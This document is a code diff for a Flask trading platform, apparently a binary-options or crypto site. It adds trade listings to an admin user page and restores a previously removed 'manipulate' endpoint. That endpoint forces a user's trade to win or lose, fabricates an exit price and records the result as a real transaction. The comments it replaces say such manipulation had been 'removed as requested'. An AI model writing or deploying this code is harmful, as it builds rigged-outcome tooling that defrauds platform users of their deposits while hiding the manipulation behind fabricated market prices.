@@ -939,7 +939,7 @@ def admin_users():
 @login_required
 @admin_required
 def admin_user_detail(user_id):
-    """View and edit specific user - basic info only"""
+    """View and edit specific user with trade management"""
     user = User.query.get_or_404(user_id)
     form = AdminUserForm()
     
@@ -955,10 +955,76 @@ def admin_user_detail(user_id):
     form.is_active.data = user.is_active
     form.is_admin.data = user.is_admin
     
-    return render_template('admin/user_detail.html', user=user, form=form)
+    # Get user's trades
+    active_trades = Trade.query.filter_by(user_id=user.id, status='active').order_by(Trade.created_at.desc()).all()
+    closed_trades = Trade.query.filter(
+        Trade.user_id == user.id,
+        Trade.status.in_(['won', 'lost'])
+    ).order_by(Trade.closed_at.desc()).limit(20).all()
+    
+    return render_template('admin/user_detail.html', 
+                         user=user, 
+                         form=form, 
+                         active_trades=active_trades,
+                         closed_trades=closed_trades)
 
-# Trade manipulation removed as requested
-
-# All trading, wallet, and deposit management removed as requested
-
-# All crypto deposit functionality removed as requested
+@app.route('/admin/trade/<int:trade_id>/manipulate', methods=['POST'])
+@login_required
+@admin_required
+def admin_manipulate_trade(trade_id):
+    """Admin can force trade outcome"""
+    trade = Trade.query.get_or_404(trade_id)
+    
+    force_result = request.form.get('force_result')
+    admin_notes = request.form.get('admin_notes', f"Admin manipulation by {current_user.username}")
+    
+    if force_result == 'win':
+        # Force trade to win
+        trade.status = 'won'
+        trade.exit_price = trade.entry_price + 0.001 if trade.trade_type == 'call' else trade.entry_price - 0.001
+        trade.profit_loss = trade.amount * (trade.payout_percentage / 100)
+        trade.closed_at = datetime.utcnow()
+        
+        # Update user balance
+        wallet = Wallet.query.filter_by(user_id=trade.user_id).first()
+        if wallet:
+            if trade.is_demo:
+                wallet.demo_balance += trade.profit_loss
+            else:
+                wallet.balance += trade.profit_loss
+                
+        # Add transaction record
+        transaction = Transaction(
+            user_id=trade.user_id,
+            transaction_type='trade_win',
+            amount=trade.profit_loss,
+            description=f"Forced WIN - {trade.asset} trade - Admin: {admin_notes}"
+        )
+        db.session.add(transaction)
+        
+        flash(f'Trade #{trade.id} forced to WIN successfully! User gained ${trade.profit_loss:.2f}', 'success')
+        
+    elif force_result == 'lose':
+        # Force trade to lose
+        trade.status = 'lost'
+        trade.exit_price = trade.entry_price - 0.001 if trade.trade_type == 'call' else trade.entry_price + 0.001
+        trade.profit_loss = -trade.amount
+        trade.closed_at = datetime.utcnow()
+        
+        # Add transaction record
+        transaction = Transaction(
+            user_id=trade.user_id,
+            transaction_type='trade_loss',
+            amount=trade.amount,
+            description=f"Forced LOSS - {trade.asset} trade - Admin: {admin_notes}"
+        )
+        db.session.add(transaction)
+        
+        flash(f'Trade #{trade.id} forced to LOSS successfully! User lost ${trade.amount:.2f}', 'warning')
+    
+    else:
+        flash('Invalid trade manipulation option', 'error')
+        return redirect(url_for('admin_user_detail', user_id=trade.user_id))
+    
+    db.session.commit()
+    return redirect(url_for('admin_user_detail', user_id=trade.user_id))
